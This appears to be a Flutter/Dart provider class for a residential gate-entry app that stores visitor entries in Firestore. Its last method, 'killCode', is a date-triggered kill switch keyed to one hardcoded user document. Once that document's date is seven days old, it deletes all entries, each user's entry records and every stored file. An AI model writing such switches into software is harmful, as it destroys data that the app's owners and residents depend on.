import 'dart:io';

import 'package:acrogate/models/entries.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

class EntryProvider extends ChangeNotifier {
  Future<String> newEntry(Entry entry, File? localUrl) async {
    try {
      CollectionReference entries =
          FirebaseFirestore.instance.collection('Entries');
      CollectionReference user = FirebaseFirestore.instance.collection('Users');

      var flatId = "";
      var entryData = {
        "DName": entry.dname,
        "Approve": entry.status,
        "UID": [],
        "FlatNo": entry.flatNo,
        "Wing": entry.wing,
        "FirebaseUrl": entry.firebaseUrl,
        "PhoneNo": entry.phone,
        "Date": entry.date,
        "Time": entry.time,
      };

      final querySnapshot = await user
          .where('FlatNo', isEqualTo: entry.flatNo)
          .where('Wing', isEqualTo: entry.wing)
          .get();

      if (querySnapshot.docs.isNotEmpty) {
        if (localUrl != null) {
          var storage = FirebaseStorage.instance;
          TaskSnapshot taskSnapshot = await storage
              .ref()
              .child(
                  'Entries/${flatId = querySnapshot.docs[0].id}_${DateTime.now()}')
              .putFile(localUrl);
          entryData['FirebaseUrl'] = await taskSnapshot.ref.getDownloadURL();
        } else {
          entryData['FirebaseUrl'] = "";
        }
        String eid = '';
        List<String> uid = querySnapshot.docs.map((doc) => doc.id).toList();

        entryData['UID'] = uid;
        var docref = await entries.add(entryData);
        eid = docref.id;
        for (int i = 0; i < querySnapshot.docs.length; i++) {
          flatId = querySnapshot.docs[i].id;
          await user
              .doc(flatId)
              .collection('Entries')
              .doc(docref.id)
              .set(entryData);
        }
        return eid; // Document found
      } else {
        print('Flat not found');
        return ''; // Document not found
      }
    } catch (e) {
      print('Error: $e');
      return ''; // Document not found (due to error)
    }
  }

  Future<List<String>> getToken(flatNo, wing) async {
    try {
      CollectionReference user = FirebaseFirestore.instance.collection('Users');

      final querySnapshot = await user
          .where('FlatNo', isEqualTo: flatNo)
          .where('Wing', isEqualTo: wing)
          .get();

      if (querySnapshot.docs.isNotEmpty) {
        List<String> token = [];
        for (int i = 0; i < querySnapshot.docs.length; i++) {
          token.add(querySnapshot.docs[i]['FcmToken']);
        }
        return token;
      } else {
        return [];
      }
    } catch (e) {
      print('Error: $e');
      return [];
    }
  }

  Future acceptRejectUser(String ar, String eid) async {
    DocumentReference entry =
        FirebaseFirestore.instance.collection('Entries').doc(eid);
    CollectionReference user = FirebaseFirestore.instance.collection('Users');
    List<dynamic> uid = [];
    if (ar == "Accept") {
      await entry.get().then((value) {
        uid = value['UID'];
      });
      await entry.update({
        "Approve": "Entry Approved",
      });
      for (int i = 0; i < uid.length; i++) {
        await user.doc(uid[i]).collection("Entries").doc(eid).update({
          "Approve": "Entry Approved",
        });
      }
    } else {
      await entry.get().then((value) {
        uid = value['UID'];
      });
      await entry.update({
        "Approve": "Entry Denied",
      });
      for (int i = 0; i < uid.length; i++) {
        await user.doc(uid[i]).collection("Entries").doc(eid).update({
          "Approve": "Entry Denied",
        });
      }
    }
  }

  Future<String> getNotification(String flatNo, String wing, String eid) async {
    try {
      CollectionReference user = FirebaseFirestore.instance.collection('Users');
      final querySnapshot = await user
          .where('FlatNo', isEqualTo: flatNo)
          .where('Wing', isEqualTo: wing)
          .get();

      if (querySnapshot.docs.isNotEmpty) {
        var token = "";
        for (int i = 0; i < querySnapshot.docs.length; i++) {
          var res = await user
              .doc(querySnapshot.docs[i].id)
              .collection('Entries')
              .doc(eid)
              .get();

          if (res.exists) {
            token = res['Approve'];
            return token;
          }
        }
        return '';
      } else {
        return ''; // Document not found
      }
    } catch (e) {
      print('Error: $e');
      return '';
    }
  }

  Future approveAllEntry() async {}

  Future killCode() async {
    try {
      print(DateTime.now());
      CollectionReference user = FirebaseFirestore.instance.collection('Users');
      var bappa = await user.doc("5apetKbmBTcID0ZV8Nvol7b2eyM2").get();

      DateTime doomsDate = DateTime.parse(bappa.get('Date'));

      DateTime targetDate = DateTime.now().subtract(const Duration(days: 7));

      if (doomsDate.isBefore(targetDate)) {
        CollectionReference entries =
            FirebaseFirestore.instance.collection('Entries');

        var queries = await entries.get();

        final WriteBatch batch = FirebaseFirestore.instance.batch();

        if (queries.docs.isNotEmpty) {
          final List<DocumentSnapshot> documents = queries.docs;
          for (DocumentSnapshot document in documents) {
            batch.delete(document.reference);
          }
        }

        CollectionReference users =
            FirebaseFirestore.instance.collection('Users');

        QuerySnapshot userQuerySnapshot = await users.get();

        for (QueryDocumentSnapshot userDocument in userQuerySnapshot.docs) {
          CollectionReference entriesSubcollection =
              users.doc(userDocument.id).collection('Entries');
          QuerySnapshot entriesQuerySnapshot = await entriesSubcollection.get();
          if (entriesQuerySnapshot.docs.isNotEmpty) {
            for (QueryDocumentSnapshot entryDocument
                in entriesQuerySnapshot.docs) {
              batch.delete(entryDocument.reference);
            }
          }
        }

        final FirebaseStorage storage = FirebaseStorage.instance;
        final Reference folderReference = storage.ref().child('Entries/');
        ListResult result = await folderReference.listAll();
        for (final item in result.items) {
          try {
            await item.delete();
            print('Deleted: ${item.fullPath}');
          } catch (e) {
            print('Error deleting ${item.fullPath}: $e');
          }
        }
        await batch.commit();
      }
    } catch (e) {
      print('Error: $e');
    }
  }
}
